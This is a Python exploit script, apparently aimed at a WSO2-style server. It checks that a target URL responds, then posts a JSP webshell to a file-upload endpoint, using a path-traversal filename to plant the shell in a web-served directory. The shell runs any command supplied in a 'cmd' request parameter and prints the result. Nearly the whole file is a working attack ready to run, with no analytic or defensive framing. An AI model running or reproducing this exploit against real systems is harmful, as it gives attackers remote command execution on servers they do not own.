from requests import get, post, exceptions
from rich import box, print
from rich.table import Table
from urllib3 import disable_warnings

from src.wsob.helpers.settings import props, get_today_date

disable_warnings()

def start(args) -> None:
    """ Check if target passed is alive """

    table = Table(title="Resume", box=box.SQUARE)

    table.add_column("Target", justify="center", style="cyan")
    table.add_column("Date", justify="center", style="cyan")
    table.add_row(f"{args.u}", get_today_date)

    print(table)

    try:
        response: str = get(f"{args.u}", **props)
        status_code: str = response.status_code

        status = lambda success = 200: status_code == success
        (exploit(args)) if status() else print(f"[red][-] Returned status code: {status_code} [/]")


    except exceptions.ConnectionError as error:
        return print(f"\n[red][-] Connection problems with {args.u} | {error} [/]")

    except exceptions.MissingSchema as error:
        return print(f"\n[red][-] Invalid URL, try with: http(s)://example.com [/]")

    except exceptions.InvalidURL as error:
        return print(f"\n[red][-] Invalid URL... | {error} [/]")

def exploit(args):
    print("\n[green][+] Connected succesfully, trying to upload webshell...")

    webshell = """<FORM>
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
    <%
    String cmd = request.getParameter("cmd");
    String output = "";
    if(cmd != null) {
        String s = null;
        try {
            Process p = Runtime.getRuntime().exec(cmd,null,null);
            BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
            while((s = sI.readLine()) != null) { output += s+"</br>"; }
        }  catch(IOException e) {   e.printStackTrace();   }
    }
%>
        <pre><%=output %></pre>"""

    shell = {f"../../../../repository/deployment/server/webapps/authenticationendpoint/authendpoint.jsp": webshell}
    upload = post(f"{args.u}/fileupload/toolsAny", files=shell, **props)
    status_code = upload.status_code

    print(f"[yellow][!] Upload status code: {status_code} [/]")
    print(f"[green][+] Webshell path: {args.u}/authenticationendpoint/authendpoint.jsp [/]")